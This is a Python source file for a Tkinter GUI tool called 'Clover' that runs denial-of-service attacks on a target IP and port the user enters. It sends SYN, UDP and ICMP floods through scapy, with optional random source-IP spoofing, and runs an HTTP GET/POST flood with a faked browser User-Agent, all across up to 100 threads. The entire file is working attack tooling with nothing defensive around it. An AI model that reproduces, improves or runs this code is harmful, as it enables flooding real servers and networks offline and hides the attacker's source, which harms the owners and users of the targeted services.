
import tkinter as tk
from tkinter import messagebox
from scapy.all import IP, TCP, UDP, ICMP, send
import threading
import time
import requests
from PIL import Image, ImageTk
import random
import socket

# Global flag to stop the attack threads
stop_attack_flag = False

# Function to validate IP address
def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)  # This will raise an exception if the IP is invalid
        return True
    except socket.error:
        return False

# Function to generate a random IP address
def generate_random_ip():
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))

# Function to perform DOS attack
def dos_attack(target_ip, target_port, attack_type, packet_rate, http_method, http_url, threads, spoof_ip, headers_enabled):
    global stop_attack_flag
    while not stop_attack_flag:
        if attack_type == 'SYN Flood':
            packet = IP(src=generate_random_ip() if spoof_ip else target_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
        elif attack_type == 'UDP Flood':
            packet = IP(src=generate_random_ip() if spoof_ip else target_ip, dst=target_ip) / UDP(dport=target_port)
        elif attack_type == 'ICMP Flood':
            packet = IP(src=generate_random_ip() if spoof_ip else target_ip, dst=target_ip) / ICMP()
        elif attack_type == 'HTTP Flood':
            while not stop_attack_flag:
                try:
                    if http_method == 'GET':
                        requests.get(http_url)
                    elif http_method == 'POST':
                        requests.post(http_url, data={"key": "value"})
                    if headers_enabled:
                        headers = {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                        }
                        requests.get(http_url, headers=headers)
                    time.sleep(1 / packet_rate)
                except requests.exceptions.RequestException as e:
                    print(f"Error in HTTP request: {e}")
                    break
            return

        send(packet)
        time.sleep(1 / packet_rate)

# Start the attack by creating threads
def start_attack():
    global stop_attack_flag

    target_ip = entry_ip.get()
    target_port = entry_port.get()
    attack_type = attack_type_var.get()
    packet_rate = packet_rate_scale.get()
    threads = thread_count_scale.get()
    spoof_ip = spoof_ip_var.get()
    headers_enabled = headers_var.get()

    if attack_type == 'HTTP Flood':
        http_url = entry_http_url.get()
        http_method = http_method_var.get()
    else:
        http_url = ''
        http_method = ''

    if not target_ip or not target_port.isdigit() or not is_valid_ip(target_ip):
        label_status.config(text="Invalid IP or port.")
        return

    target_port = int(target_port)

    label_selected_target.config(text=f"Selected Target: {target_ip}")

    # Reset the stop flag
    stop_attack_flag = False

    # Create threads for attack
    for _ in range(threads):
        threading.Thread(target=dos_attack, args=(target_ip, target_port, attack_type, packet_rate, http_method, http_url, threads, spoof_ip, headers_enabled), daemon=True).start()
    
    label_status.config(text=f"Attacking {target_ip}:{target_port} with {attack_type}...")

# Stop the attack by setting the stop flag
def stop_attack():
    global stop_attack_flag
    stop_attack_flag = True
    label_status.config(text="Attack stopped.")

root = tk.Tk()
root.title("Clover")

root.config(bg="#111111")

# Update this path with the correct image file
banner_image = Image.open("/home/oblatrant/Downloads/GUI/IMG_5808.PNG")  # Change the path if necessary
banner_image = banner_image.resize((500, 150))
banner_image = ImageTk.PhotoImage(banner_image)

banner_label = tk.Label(root, image=banner_image, bg="#111111")
banner_label.grid(row=0, column=0, columnspan=3, pady=10)

label_target = tk.Label(root, text="Enter Target IP or URL:", font=("Courier New", 14), fg="#32CD32", bg="#111111")
label_target.grid(row=2, column=0, pady=5, sticky="e")
entry_ip = tk.Entry(root, font=("Courier New", 14), bg="#222222", fg="#32CD32", insertbackground="white", relief="solid", bd=2)
entry_ip.grid(row=2, column=1, pady=5, sticky="w")

label_port = tk.Label(root, text="Target Port:", font=("Courier New", 14), fg="#32CD32", bg="#111111")
label_port.grid(row=3, column=0, pady=5, sticky="e")
entry_port = tk.Entry(root, font=("Courier New", 14), bg="#222222", fg="#32CD32", insertbackground="white", relief="solid", bd=2)
entry_port.grid(row=3, column=1, pady=5, sticky="w")

label_selected_target = tk.Label(root, text="Selected Target: None", font=("Courier New", 16), fg="#FF6347", bg="#111111")
label_selected_target.grid(row=4, column=0, columnspan=3, pady=10)

label_attack_type = tk.Label(root, text="Attack Type:", font=("Courier New", 14), fg="#32CD32", bg="#111111")
label_attack_type.grid(row=5, column=0, pady=5, sticky="e")

attack_type_var = tk.StringVar()
attack_type_var.set('SYN Flood')

attack_type_menu = tk.OptionMenu(root, attack_type_var, 'SYN Flood', 'UDP Flood', 'ICMP Flood', 'HTTP Flood')
attack_type_menu.config(font=("Courier New", 14), fg="#32CD32", bg="#222222", relief="solid")
attack_type_menu.grid(row=5, column=1, pady=5, sticky="w")

label_http_url = tk.Label(root, text="HTTP URL (for HTTP Flood):", font=("Courier New", 14), fg="#32CD32", bg="#111111")
label_http_url.grid(row=6, column=0, pady=5, sticky="e")

entry_http_url = tk.Entry(root, font=("Courier New", 14), bg="#222222", fg="#32CD32", insertbackground="white", relief="solid", bd=2)
entry_http_url.grid(row=6, column=1, pady=5, sticky="w")

label_http_method = tk.Label(root, text="HTTP Method:", font=("Courier New", 14), fg="#32CD32", bg="#111111")
label_http_method.grid(row=7, column=0, pady=5, sticky="e")

http_method_var = tk.StringVar()
http_method_var.set('GET')

http_method_menu = tk.OptionMenu(root, http_method_var, 'GET', 'POST')
http_method_menu.config(font=("Courier New", 14), fg="#32CD32", bg="#222222", relief="solid")
http_method_menu.grid(row=7, column=1, pady=5, sticky="w")

label_threads = tk.Label(root, text="Number of Threads:", font=("Courier New", 14), fg="#32CD32", bg="#111111")
label_threads.grid(row=8, column=0, pady=5, sticky="e")

thread_count_scale = tk.Scale(root, from_=1, to_=100, orient="horizontal", font=("Courier New", 14), bg="#222222", fg="#32CD32", troughcolor="#555555", sliderlength=30)
thread_count_scale.set(10)
thread_count_scale.grid(row=8, column=1, pady=5, sticky="w")

label_packet_rate = tk.Label(root, text="Packet Rate:", font=("Courier New", 14), fg="#32CD32", bg="#111111")
label_packet_rate.grid(row=9, column=0, pady=5, sticky="e")

packet_rate_scale = tk.Scale(root, from_=1, to_=100, orient="horizontal", font=("Courier New", 14), bg="#222222", fg="#32CD32", troughcolor="#555555", sliderlength=30)
packet_rate_scale.set(10)
packet_rate_scale.grid(row=9, column=1, pady=5, sticky="w")

spoof_ip_var = tk.BooleanVar()
spoof_ip_checkbox = tk.Checkbutton(root, text="Enable IP Spoofing", variable=spoof_ip_var, font=("Courier New", 14), fg="#32CD32", bg="#111111", selectcolor="#32CD32")
spoof_ip_checkbox.grid(row=10, column=0, columnspan=2, pady=5)

headers_var = tk.BooleanVar()
headers_checkbox = tk.Checkbutton(root, text="Enable Header Modification", variable=headers_var, font=("Courier New", 14), fg="#32CD32", bg="#111111", selectcolor="#32CD32")
headers_checkbox.grid(row=11, column=0, columnspan=2, pady=5)

button_start = tk.Button(root, text="Start Attack", font=("Courier New", 14), fg="black", bg="#32CD32", command=start_attack, relief="solid", bd=2)
button_start.grid(row=12, column=0, columnspan=2, pady=15)

button_stop = tk.Button(root, text="Stop Attack", font=("Courier New", 14), fg="black", bg="#FF6347", command=stop_attack, relief="solid", bd=2)
button_stop.grid(row=13, column=0, columnspan=2, pady=5)

label_status = tk.Label(root, text="Status: Ready", font=("Courier New", 14), fg="#32CD32", bg="#111111")
label_status.grid(row=14, column=0, columnspan=2, pady=10)

root.geometry("500x750")
root.resizable(False, False)

root.mainloop()

